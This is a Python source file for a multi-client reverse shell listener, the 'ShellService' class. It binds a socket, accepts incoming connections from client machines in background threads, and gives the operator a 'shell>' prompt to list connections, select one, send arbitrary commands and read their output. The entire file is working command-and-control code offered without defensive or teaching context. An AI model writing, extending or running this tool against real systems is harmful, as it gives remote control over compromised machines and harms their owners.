import socket
import sys
import threading

from queue import Queue


# Threads for multi-client support
NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
client_queue = Queue()


class ShellService:
    """Class used to create and control a reverse shell service"""

    def __init__(self, host, port):
        self.host = host
        self.port = port

        self.ENCODING = 'utf-8'
        self.HEADER_LENGTH = 10

        self.server_socket = None
        self.sockets_list = []
        self.address_list = []

    def _send_command(self, sock, cmd):
        """Encodes and sends commands to the client"""
        # Form the command header
        command_header = f"{len(cmd): <{self.HEADER_LENGTH}}".encode(self.ENCODING)
        command = cmd.encode(self.ENCODING)

        # Send of the command data to the client
        sock.send(command_header + command)

    def _receive_response(self, sock):
        """Receives the command output from the client machine"""
        try:

            response_header = sock.recv(self.HEADER_LENGTH)

            if not response_header:
                return None

            response_length = int(response_header.decode(self.ENCODING).strip())
            response = sock.recv(response_length).decode(self.ENCODING)

            return response

        except:
            return None

    def _purge_connections(self):
        """Purges all existing connections"""
        for conn in self.sockets_list:
            try:
                conn.shutdown(socket.SHUT_RDWR)
                conn.close()
            except socket.error:
                print("[-] A connection was already closed")

        del self.sockets_list[:]
        del self.address_list[:]

    def accept_connections(self):
        """Background thread accepting new connections"""
        # Remove any old and invalid connections
        self._purge_connections()

        # Continue accepting new connections
        while True:
            try:
                conn, addr = self.server_socket.accept()

                # Make the connection blocking
                conn.setblocking(True)
                self.sockets_list.append(conn)
                self.address_list.append(addr)
                print("\n[+] Accepted a new connection from {}:{}\n".format(*addr))
            except KeyboardInterrupt:
                break

    def list_connections(self):
        """Lists all established connections for the user"""
        results = ''

        for id, conn in enumerate(self.sockets_list):

            # Ensure that the connection is valid
            try:
                self._send_command(conn, cmd='')
                self._receive_response(conn)

            except:
                # Delete the invalid connection
                del self.address_list[id]
                del self.sockets_list[id]

                continue

            results += str(id) + '    ' + str(self.address_list[id][0]) + '    ' + str(self.address_list[id][1]) + '\n'
        print('----- Clients -----' + '\n' + results)

    def send_target_commands(self, conn):
        """Send commands to a client machine"""
        while True:
            try:
                cmd = input()

                if cmd == 'quit':
                    self._send_command(conn, cmd)

                    # Update the appropriate lists
                    indx = self.sockets_list.index(conn)
                    del self.sockets_list[indx]
                    del self.address_list[indx]
                    break

                if cmd:
                    self._send_command(conn, cmd)
                    client_response = self._receive_response(conn)
                    print(client_response, end='')

            except:
                print("[-] Connection lost")
                break

    def get_connection(self, message):
        """Select a listed connection"""

        # First parse the selection message
        try:
            conn_id = message.replace('select ', '')
            conn_id = int(conn_id)

            # Find the desired connection object
            conn = self.sockets_list[conn_id]
            print(f"[+] Connected to {self.address_list[conn_id][0]}")
            print(str(self.address_list[conn_id][0]) + '> ', end='')

            return conn

        except:
            print("[-] Not a valid selection")
            return None

    def interactive_prompt(self):
        """Interactive prompt used to select and list connections"""
        while True:
            cmd = input('shell> ')

            if cmd == 'list':
                self.list_connections()

            # Parse input
            elif cmd == ('quit' or 'shutdown'):
                # End the daemon tasks
                client_queue.task_done()
                client_queue.task_done()
                # Kill all connections
                self.stop()
                break

            elif 'select' in cmd:
                conn = self.get_connection(cmd)

                # Send commands if a valid connection was received
                if conn:
                    self.send_target_commands(conn)

            elif cmd == '':
                pass
            else:
                print("[-] Command not recognized")
        return

    def job_handler(self):
        """
            Handles the jobs at hand.
            A job can either be acceptance of connections
            or the transmission of commands to a client.
        """
        while True:
            job = client_queue.get()

            # Handles the acceptance of new connections
            if job == 1:
                self.setup()
                self.accept_connections()

            # Handles the transmission of commands
            elif job == 2:
                self.interactive_prompt()

            client_queue.task_done()

    def build_threads(self):
        """Generic function for defining the necessary threads"""
        for _ in range(NUMBER_OF_THREADS):
            thread = threading.Thread(target=self.job_handler)
            thread.daemon = True
            thread.start()

    @staticmethod
    def create_jobs():
        for job in JOB_NUMBER:
            client_queue.put(job)

        client_queue.join()

    def setup(self):
        """Configures the service"""
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.setblocking(True)
            self.server_socket.listen(5)
        except socket.error as msg:
            print("[!] Socket creation error: " + str(msg))
            sys.exit()

    def start(self):
        """Begin running the service"""
        print(f"[+] Listening for connections on {self.host} : {self.port}...")

        # Initiate daemons
        self.build_threads()
        self.create_jobs()

    def stop(self):
        # First end all tasks
        client_queue.task_done()
        client_queue.task_done()

        self._purge_connections()
        self.server_socket.shutdown(socket.SHUT_RDWR)
        self.server_socket.close()
